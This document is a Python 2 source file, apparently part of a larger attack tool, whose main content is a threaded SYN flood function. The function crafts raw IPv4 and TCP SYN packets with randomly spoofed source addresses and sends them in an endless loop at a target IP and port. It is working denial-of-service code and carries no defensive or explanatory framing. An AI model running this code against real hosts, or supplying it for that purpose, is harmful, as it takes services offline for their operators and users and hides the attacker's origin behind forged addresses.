import sys
import socket
import random
import struct
from struct import *

def calcChecksum(header):
    unpacked = struct.unpack('!'+'H'*(len(header)/2), header)
    total = 0
    for half in unpacked:
        total+=half

    checksum = (total & 0xffff) + (total>>16)
    checksum = ~checksum & 0xffff
    
    return checksum

def synFlood(ID, portDest, ipDest, event, queue):
    print "[SYN_FLOOD] Thread %s started\n" % (ID)
    while event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,\
                              socket.IPPROTO_TCP)
        except:
            sys.exit()

        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        ipSource = socket.inet_ntoa(struct.pack('>I',\
                                                random.randint(1, 0xffffffff)))

        versionIhlDscpEcn = 0x45000028
        identification = random.randint(1, 0xffff)
        flagsFragoffset = 0x00004006
        srcIp = socket.inet_aton(ipSource)    
        dstIp = socket.inet_aton(ipDest) 

        ipv4Header = pack("!IHIH4s4s", versionIhlDscpEcn, identification,\
                          flagsFragoffset, 0x0, srcIp, dstIp)
        cs = calcChecksum(ipv4Header)
        ipv4Header = pack("!IHIH4s4s", versionIhlDscpEcn, identification,\
                          flagsFragoffset, cs, srcIp, dstIp)

        srcPort = random.randint(1, 0xffff)
        dstPort = int(portDest)
        seqNum = 0x0
        ackNum = random.randint(1, 0xffffffff)
        offsetFlagsWsize = 0x50020200
        uPointer = 0x0

        tcpHeader = pack("!HHIIIHH", srcPort, dstPort, seqNum, ackNum,\
                         offsetFlagsWsize, 0x0, uPointer)

        zerosProtocol = (0x0 + socket.IPPROTO_TCP)
        tcpLen = len(tcpHeader)
        fakeHeader = pack("!4s4sII", srcIp, dstIp, zerosProtocol, tcpLen)
        cs = calcChecksum(fakeHeader + tcpHeader)

        tcpHeader = pack("!HHIIIHH", srcPort, dstPort, seqNum, ackNum,\
                         offsetFlagsWsize, cs, uPointer)

        # Prints para se quiser ver os headers sendo gerados
        # print struct.unpack("!IHIHII", ipv4Header)
        # print struct.unpack("!HHIIII", tcpHeader)
        # print struct.unpack("!IIIIIIIIII", packet)
        
        packet = ipv4Header + tcpHeader;
        s.sendto(packet, (ipDest, 0))
    print "[SYN_FLOOD] Thread %s finished\n" % (ID)
    queue.task_done()

